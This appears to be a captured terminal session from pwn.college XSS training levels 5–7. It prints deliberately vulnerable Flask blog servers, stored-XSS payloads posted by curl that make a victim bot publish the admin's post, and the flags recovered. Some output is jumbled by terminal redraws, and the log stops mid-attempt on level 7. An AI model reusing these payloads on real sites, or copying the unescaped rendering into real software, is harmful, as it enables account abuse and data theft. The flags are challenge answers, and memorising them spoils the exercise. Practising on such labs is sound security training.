@@ -642,3 +642,1725 @@ Welcome to pwnpost, now with users!<hr>
               <input type=submit name=submit value=Login>
             </form><hr>
         </body></html>hacker@web-security~xss-5:~$
+hacker@web-security~xss-5:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["GET"])
+def challenge_publish():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username = flask.session.get("username", None)
+    if username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-5:~$ /challenge/server &
+[1] 144
+hacker@web-security~xss-5:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+curl http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 12:35:10] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        </body></html>hacker@web-security~xss-5:~$ curl -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" -c hacker
+127.0.0.1 - - [20/May/2026 12:35:52] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-5:~$ curl -b hacker http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 12:35:58] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>hacker@web-securith^C
+hacker@web-security~xss-5:~$ curl -b hacker -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish")</script>&publish=true'
+127.0.0.1 - - [20/May/2026 12:38:42] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-5:~$ curl -b hacker http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 12:38:48] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("/publish")</script><hr>
+hacker@web-security~xss-5:~$ rity~xX POST http://challenge.localhost:80/login -d "username=guest&password=password" -c guest127.0.0.1 - - [20/May/2026 12:39:44] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-5:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 12:39:54] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("/publish")</script><hr>
+</body></html>hacker@web-security~xss-5:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 12:40:15] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 12:40:15] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 12:40:16] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 12:40:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 12:40:16] "GET /publish HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 12:40:16] "GET / HTTP/1.1" 200 -
+Visited! Go check if the attack worked!
+hacker@web-security~xss-5:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 12:40:23] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        <h2>Author: admin</h2>pwn.college{MPrFhMkbFYKKDnIWgqaVqbhI6gD.QX2kzMzwyNyETO2EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("/publish")</script><hr>
+</body></html>hacker@web-security~xss-5:~$
+Connected!
+hacker@web-security~xss-6:~$ Read from remote host dojo.pwn.college: Connection reset by peer
+Connection to dojo.pwn.college closed.
+client_loop: send disconnect: Broken pipe
+╭─  zsh   ~  祥3668s 
+╰─> ssh -i ~/.ssh/pwncollege hacker@dojo.pwn.college                                                 77%   20, 20:03 
+Connected!
+hacker@web-security~xss-6:~$ cat /challenge/ss
+cat: /challenge/ss: No such file or directory
+hacker@web-security~xss-6:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username = flask.session.get("username", None)
+    if not username:
+        flask.abort(403, "Log in first!")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username = flask.session.get("username", None)
+    if not username:
+        flask.abort(403, "Log in first!")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username = flask.session.get("username", None)
+    if username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-6:~$ /challenge/server &
+[1] 159
+hacker@web-security~xss-6:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+curl http://challenge.localhost:80/login -d "username=hacker&password=1337" -c hacker
+127.0.0.1 - - [20/May/2026 13:05:50] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-6:~$ curl -b hacker -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish", {method: "POST"})</script>&publish=true'
+127.0.0.1 - - [20/May/2026 13:09:15] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-6:~$ curl http://challenge.localhost:80/login -d "username=guest&password=password" -c guest
+127.0.0.1 - - [20/May/2026 13:09:36] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-6:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 13:09:49] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("/publish", {method: "POST"})</script><hr>
+</body></html>hacker@web-security~xss-6:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 13:10:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 13:10:58] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 13:10:59] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 13:10:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 13:10:59] "POST /publish HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 13:10:59] "GET / HTTP/1.1" 200 -
+Visited! Go check if the attack worked!
+hacker@web-security~xss-6:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 13:11:11] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>pwn.college{kOKDk1Z3KWqoa8kSzNCw0GDRE8G.QXwgTN2wyNyETO2EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("/publish", {method: "POST"})</script><hr>
+</body></html>hacker@web-security~xss-6:~$
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server &
+[1] 143
+hacker@web-security~xss-7:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+curl pwn.college{kOKDk1Z3KWqo^C
+hacker@web-security~xss-7:~$ curl -v -X POST http://challenge.localhost:80/login -d
+curl: option -d: requires parameter
+curl: try 'curl --help' for more information
+hacker@web-security~xss-7:~$
+hacker@web-security~xss-7:~$ curl -v -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" -c hacker
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 51628 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 37964
+* using HTTP/1.x
+> POST /login HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 29
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 29 bytes
+127.0.0.1 - - [20/May/2026 13:20:37] "POST /login HTTP/1.1" 302 -
+< HTTP/1.1 302 FOUND
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Wed, 20 May 2026 13:20:37 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 189
+< Location: /
+* Added cookie auth="hacker|1337" for domain challenge.localhost, path /, expire 0
+< Set-Cookie: auth=hacker|1337; Path=/
+< Connection: close
+<
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+* shutting down connection #0
+hacker@web-security~xss-7:~$ cat hacker
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+challenge.localhost	FALSE	/	FALSE	0	auth	hacker|1337
+hacker@web-security~xss-7:~$ curl -b hacker http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 13:21:16] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+hacker@web-security~xss-7:~$ >(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>hack&publish=true"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 39862 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 46050
+* using HTTP/1.x
+> POST /draft HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: auth=hacker|1337
+> Content-Length: 28
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 28 bytes
+127.0.0.1 - - [20/May/2026 13:22:33] "POST /draft HTTP/1.1" 302 -
+< HTTP/1.1 302 FOUND
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Wed, 20 May 2026 13:22:33 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 189
+< Location: /
+< Connection: close
+<
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+* shutting down connection #0
+hacker@web-security~xss-7:~$ curl -v -b hacker -X POST http://challenge.localhost:80/draft -d "content=<script&publish=true"
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server &
+[1] 143
+hacker@web-security~xss-7:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit          url -v -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" -c hacker
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 52698 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 48290
+* using HTTP/1.x
+> POST /login HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 29
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 29 bytes
+127.0.0.1 - - [20/May/2026 13:23:04] "POST /login HTTP/1.1" 302 -
+< HTTP/1.1 302 FOUND
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Wed, 20 May 2026 13:23:04 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 189
+< Location: /
+* Added cookie auth="hacker|1337" for domain challenge.localhost, path /, expire 0
+< Set-Cookie: auth=hacker|1337; Path=/
+< Connection: close
+<
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+* shutting down connection #0
+hacker@web-security~xss-7:~$ curl -b hacker http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 13:25:03] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
